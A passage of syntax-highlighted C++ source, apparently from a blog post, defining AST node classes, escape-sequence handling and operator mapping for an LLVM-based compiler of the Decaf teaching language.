class="title">getLLVMType</span><span class="params">(llvmType ty, llvm::LLVMContext &amp;Context )</span> </span>&#123; </span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (ty) &#123;</span><br><span class="line">        <span class="keyword">case</span> voidTy: <span class="keyword">return</span> llvm::Type::<span class="built_in">getVoidTy</span>(Context);</span><br><span class="line">        <span class="keyword">case</span> intTy: <span class="keyword">return</span> llvm::Type::<span class="built_in">getInt32Ty</span>(Context);</span><br><span class="line">        <span class="keyword">case</span> boolTy: <span class="keyword">return</span> llvm::Type::<span class="built_in">getInt1Ty</span>(Context);</span><br><span class="line">        <span class="keyword">case</span> stringTy: <span class="keyword">return</span> llvm::Type::<span class="built_in">getInt8PtrTy</span>(Context); </span><br><span class="line">		<span class="keyword">default</span>: <span class="keyword">throw</span> <span class="built_in">runtime_error</span>(<span class="string">&quot;unknown type&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="function">llvm::Value *<span class="title">listCodegen</span><span class="params">(list&lt;T&gt; vec)</span> </span>&#123;</span><br><span class="line">	llvm::Value *val = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">typename</span> list&lt;T&gt;::iterator i = vec.<span class="built_in">begin</span>(); i != vec.<span class="built_in">end</span>(); i++) &#123; </span><br><span class="line">		llvm::Value *j = (*i)-&gt;<span class="built_in">Codegen</span>();</span><br><span class="line">		<span class="keyword">if</span> (j != <span class="literal">NULL</span>) &#123; val = j; &#125;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">getString</span><span class="params">(decafAST *d)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (d != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> d-&gt;<span class="built_in">str</span>();</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;None&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="function">string <span class="title">commaList</span><span class="params">(list&lt;T&gt; vec)</span> </span>&#123;</span><br><span class="line">    <span class="function">string <span class="title">s</span><span class="params">(<span class="string">&quot;&quot;</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">typename</span> list&lt;T&gt;::iterator i = vec.<span class="built_in">begin</span>(); i != vec.<span class="built_in">end</span>(); i++) &#123; </span><br><span class="line">        s = s + (s.<span class="built_in">empty</span>() ? <span class="built_in">string</span>(<span class="string">&quot;&quot;</span>) : <span class="built_in">string</span>(<span class="string">&quot;,&quot;</span>)) + (*i)-&gt;<span class="built_in">str</span>(); </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">if</span> (s.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        s = <span class="built_in">string</span>(<span class="string">&quot;None&quot;</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// decafStmtList - List of Decaf statements</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafStmtList</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafAST *&gt; stmts;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafStmtList</span>() &#123;&#125;</span><br><span class="line">	~<span class="built_in">decafStmtList</span>() &#123;</span><br><span class="line">		<span class="keyword">for</span> (list&lt;decafAST *&gt;::iterator i = stmts.<span class="built_in">begin</span>(); i != stmts.<span class="built_in">end</span>(); i++) &#123; </span><br><span class="line">			<span class="keyword">delete</span> *i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> stmts.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafAST *e)</span> </span>&#123; stmts.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafAST *e)</span> </span>&#123; stmts.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function">list&lt;decafAST *&gt; <span class="title">get_para</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> stmts; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> commaList&lt;class decafAST *&gt;(stmts); &#125;</span><br><span class="line">	<span class="function">llvm::Value * <span class="title">Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> listCodegen&lt;decafAST *&gt;(stmts); </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafAllexp</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Kind;</span><br><span class="line">	string Name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function">string <span class="title">get_name</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Name; &#125;</span><br><span class="line">	<span class="function">string <span class="title">get_kind</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Kind; &#125;</span><br><span class="line">	<span class="built_in">decafAllexp</span>()&#123;&#125;</span><br><span class="line">	<span class="built_in">decafAllexp</span>(string name,string kind) : <span class="built_in">Name</span>(name),<span class="built_in">Kind</span>(kind)&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;des.kind = valueK;</span><br><span class="line">		map&lt;string,<span class="keyword">int</span>&gt; tab = &#123;</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\t&#x27;&quot;</span>,<span class="string">&#x27;\t&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\r&#x27;&quot;</span>,<span class="string">&#x27;\r&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\n&#x27;&quot;</span>,<span class="string">&#x27;\n&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\a&#x27;&quot;</span>,<span class="string">&#x27;\a&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\v&#x27;&quot;</span>,<span class="string">&#x27;\v&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\b&#x27;&quot;</span>,<span class="string">&#x27;\b&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\f&#x27;&quot;</span>,<span class="string">&#x27;\f&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\\\&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\\&#x27;&#x27;&quot;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\\&quot;&#x27;&quot;</span>,<span class="string">&#x27;\&quot;&#x27;</span>&#125;,</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="keyword">if</span>( kind == <span class="string">&quot;NumberExpr&quot;</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(tab.<span class="built_in">count</span>(<span class="keyword">this</span>-&gt;Name))&#123;</span><br><span class="line">				<span class="keyword">this</span>-&gt;Name = <span class="built_in">to_string</span>(tab[<span class="keyword">this</span>-&gt;Name]);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;Name.<span class="built_in">size</span>() == <span class="number">1</span>)&#123;</span><br><span class="line">				<span class="keyword">this</span>-&gt;Name = <span class="built_in">to_string</span>(Name[<span class="number">0</span>]<span class="number">-48</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;Name.<span class="built_in">size</span>() == <span class="number">3</span> &amp;&amp; ( <span class="keyword">this</span>-&gt;Name[<span class="number">0</span>]==<span class="string">&#x27;\&#x27;&#x27;</span> || <span class="keyword">this</span>-&gt;Name[<span class="number">0</span>]==<span class="string">&#x27;\&quot;&#x27;</span> ))&#123;</span><br><span class="line">				<span class="keyword">this</span>-&gt;Name = <span class="built_in">to_string</span>(Name[<span class="number">1</span>]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>( kind == <span class="string">&quot;StringConstant&quot;</span>)&#123;</span><br><span class="line">			string s = <span class="keyword">this</span>-&gt;<span class="built_in">get_name</span>().<span class="built_in">erase</span>(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">			s.<span class="built_in">pop_back</span>();</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">length</span>();i++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(s[i] == <span class="string">&#x27;\\&#x27;</span>)&#123;</span><br><span class="line">					<span class="keyword">char</span> t[<span class="number">0x8</span>];</span><br><span class="line">					<span class="built_in">sprintf</span>(t,<span class="string">&quot;&#x27;\\%c&#x27;&quot;</span>,s[i+<span class="number">1</span>]);</span><br><span class="line">					s[i+<span class="number">1</span>] = tab[t];</span><br><span class="line">					<span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;s.<span class="built_in">length</span>()<span class="number">-1</span>;j++)&#123;</span><br><span class="line">						s[j] = s[j+<span class="number">1</span>];</span><br><span class="line">					&#125;</span><br><span class="line">					s.<span class="built_in">pop_back</span>();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">this</span>-&gt;Name = s;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> Kind + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafArrexp</span> :</span> <span class="keyword">public</span> decafAllexp &#123;</span><br><span class="line">	string Name;</span><br><span class="line">	decafAllexp * Exp;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafArrexp</span>(string Name, decafAllexp *Exp) </span><br><span class="line">		: <span class="built_in">Name</span>(Name), <span class="built_in">Exp</span>(Exp) &#123;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;ArrayLocExpr&quot;</span>) + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Exp) + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafBinexp</span> :</span> <span class="keyword">public</span> decafAllexp &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	string Option;</span><br><span class="line">	decafBinexp * Exp1;</span><br><span class="line">	decafBinexp * Exp2;</span><br><span class="line">	<span class="built_in">decafBinexp</span>()&#123;&#125;</span><br><span class="line">	<span class="built_in">decafBinexp</span>(string op, decafBinexp *exp1, decafBinexp *exp2) </span><br><span class="line">		: <span class="built_in">Option</span>(op), <span class="built_in">Exp1</span>(exp1), <span class="built_in">Exp2</span>(exp2) &#123;</span><br><span class="line">			<span class="keyword">this</span>-&gt;des.kind = expbK;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">get_op</span><span class="params">(string Option)</span></span>;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;BinaryExpr&quot;</span>) + <span class="string">&quot;(&quot;</span> + Option + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Exp1) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Exp2) + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">decafBinexp::get_op</span><span class="params">(string Option)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(Option == <span class="string">&quot;Plus&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> addtmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Minus&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> subtmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Mult&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> multmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;UnaryMinus&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> negtmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Div&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> divtmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Mod&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> remtmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Or&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> ortmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;And&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> andtmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Eq&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> eqtmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Neq&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> netmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Not&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> nottmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Lt&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> slttmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Gt&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> sgttmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Leq&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> sletmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Geq&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> sgetmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Leftshift&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> shltmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Rightshift&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> shrtmp;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafUnaryexp</span> :</span> <span class="keyword">public</span> decafBinexp &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafUnaryexp</span>()&#123;&#125;</span><br><span class="line">	<span class="built_in">decafUnaryexp</span>(string op, decafBinexp *exp1)&#123;</span><br><span class="line">		decafBinexp::Option = op;</span><br><span class="line">		decafBinexp::Exp1 = exp1;</span><br><span class="line">		decafBinexp::Exp2 = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">this</span>-&gt;des.kind = expuK;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;UnaryExpr&quot;</span>) + <span class="string">&quot;(&quot;</span> + Option + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Exp1) + <span class="string">&quot;)&quot;</span>; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafType</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Type;</span><br><span class="line">	string Name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	llvm::Type* lType;</span><br><span class="line">	llvmType Ty;</span><br><span class="line">	<span class="function">string <span class="title">get_type</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Type; &#125;</span><br><span class="line">	<span class="function">string <span class="title">get_name</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Name; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_name</span><span class="params">(string Name)</span></span>&#123; <span class="keyword">this</span>-&gt;Name = Name;&#125;</span><br><span class="line">	<span class="built_in">decafType</span>(string Type)&#123;<span class="keyword">this</span>-&gt;Type = Type;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(Name != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;VarDef(&quot;</span>+Name+<span class="string">&quot;,&quot;</span>+Type+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;VarDef(&quot;</span>+Type+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafVar</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Type;</span><br><span class="line">	string Name;</span><br><span class="line">	string Kind;</span><br><span class="line">	decafAllexp* Exp;</span><br><span class="line">	decafAllexp* Arr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	llvm::AllocaInst *Alloca;</span><br><span class="line">	llvm::Type* lType;</span><br><span class="line">	<span class="built_in">decafVar</span>(string Name) &#123;<span class="keyword">this</span>-&gt;Name = Name;&#125;</span><br><span class="line">	<span class="function">string <span class="title">get_type</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Type;&#125;</span><br><span class="line">	<span class="function">string <span class="title">get_name</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Name;&#125;</span><br><span class="line">	<span class="function">string <span class="title">get_kind</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Kind;&#125;</span><br><span class="line">	<span class="function">decafAllexp* <span class="title">get_arr</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Arr;&#125;</span><br><span class="line">	<span class="function">decafAllexp* <span class="title">get_exp</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Exp;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_type</span><span class="params">(decafType* type)</span></span>&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;Type = type-&gt;<span class="built_in">get_type</span>();</span><br><span class="line">		<span class="keyword">this</span>-&gt;lType = type-&gt;lType;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_name</span><span class="params">(string Name)</span></span>&#123;<span class="keyword">this</span>-&gt;Name = Name;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_kind</span><span class="params">(string Kind)</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">this</span>-&gt;Kind == <span class="string">&quot;&quot;</span>)</span><br><span class="line">			<span class="keyword">this</span>-&gt;Kind = Kind;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_arr</span><span class="params">(decafAllexp* Arr)</span></span>&#123;<span class="keyword">this</span>-&gt;Arr = Arr;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_exp</span><span class="params">(decafAllexp* Exp)</span></span>&#123;<span class="keyword">this</span>-&gt;Exp = Exp;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">if</span>(Exp != <span class="literal">NULL</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;AssignGlobalVar(&quot;</span>+Name+<span class="string">&quot;,&quot;</span>+Type+<span class="string">&quot;,&quot;</span>+<span class="built_in">getString</span>(Exp)+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(Kind != <span class="string">&quot;&quot;</span> &amp;&amp; Name != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;FieldDecl(&quot;</span>+Name+<span class="string">&quot;,&quot;</span>+Type+<span class="string">&quot;,&quot;</span>+Kind+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;	</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(Name != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;VarDef(&quot;</span>+Name+<span class="string">&quot;,&quot;</span>+Type+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;VarDef(&quot;</span>+Type+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafVarList</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafVar*&gt; List;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function">list&lt;decafVar*&gt; <span class="title">get_list</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;List; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> List.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafVar *e)</span> </span>&#123; List.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafVar *e)</span> </span>&#123; List.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">cat_front</span><span class="params">(decafVarList* List)</span> </span>&#123;</span><br><span class="line">		list&lt;decafVar*&gt; l = List-&gt;<span class="built_in">get_list</span>();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> e:l)&#123;</span><br><span class="line">			<span class="keyword">this</span>-&gt;List.<span class="built_in">push_front</span>(e); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_types</span><span class="params">(decafType* Type)</span></span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> e:<span class="keyword">this</span>-&gt;List)&#123;</span><br><span class="line">			e-&gt;<span class="built_in">put_type</span>(Type); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_kinds</span><span class="params">(string Kind)</span></span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> e:<span class="keyword">this</span>-&gt;List)&#123;</span><br><span class="line">			e-&gt;<span class="built_in">put_kind</span>(Kind); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> commaList&lt;class decafVar *&gt;(List);&#125;</span><br><span class="line">	<span class="function">llvm::Value * <span class="title">Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> listCodegen&lt;decafVar *&gt;(List); </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafOutput</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Data;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafOutput</span>(string Data)&#123;<span class="keyword">this</span>-&gt;Data = Data;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> Data; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafPara</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafType *&gt; Para;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> Para.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafType *e)</span> </span>&#123; Para.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafType *e)</span> </span>&#123; Para.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function">list&lt;decafType *&gt; <span class="title">get_para</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> Para; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> commaList&lt;class decafType *&gt;(Para); &#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafStmt</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	llvmStmt kind;</span><br><span class="line">	<span class="built_in">decafStmt</span>()&#123;&#125;</span><br><span class="line">	<span class="function">llvm::Value * <span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafStmts</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafStmt *&gt; stmts;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafStmts</span>() &#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> stmts.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafStmt *e)</span> </span>&#123; stmts.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafStmt *e)</span> </span>&#123; stmts.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function">list&lt;decafStmt *&gt; <span class="title">get_para</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> stmts; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> commaList&lt;class decafStmt *&gt;(stmts); &#125;</span><br><span class="line">	<span class="function">llvm::Value * <span class="title">Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		llvm::Value* v = listCodegen&lt;decafStmt *&gt;(stmts); </span><br><span class="line">		<span class="keyword">return</span> v;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafFunCall</span> 